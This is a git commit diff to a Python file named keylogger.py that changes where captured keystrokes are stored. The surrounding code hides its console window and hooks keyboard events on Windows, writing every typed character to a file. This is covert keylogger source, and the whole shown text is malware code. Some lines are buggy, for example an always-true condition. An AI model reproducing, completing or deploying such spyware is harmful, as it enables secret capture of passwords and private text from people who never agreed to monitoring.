ed0282e3e964844fde2ee3862aaf0af94e8b077b
Talha Çelik <talhacelik81@hotmail.com>
2017-04-04 21:28:26 +0300

    Add files via upload

--- keylogger.py
+++ keylogger.py
@@ -2,6 +2,10 @@ import win32api
 import win32console
 import win32gui
 import pythoncom,pyHook
+from os import name
+from os_detect import OsDetect
+
+path_obj= OsDetect()
 
 win=win32console.GetConsoleWindow()
 win32gui.ShowWindow(win,0)
@@ -10,10 +14,10 @@ def OnKeyboardEvent(event):
     if event.Ascii==5:
         _exit(1)
     if event.Ascii !=0 or 8:
-        f=open('c:\output.txt','r+')
+        f=open(path_obj.get_os_for_file_name,'r+')
         buffer=f.read()
         f.close()
-        f=open('c:\output.txt','w')
+        f=open(path_obj.get_os_for_file_name,'w')
         keylogs=chr(event.Ascii)
         if event.Ascii==13:
             keylogs='/n'
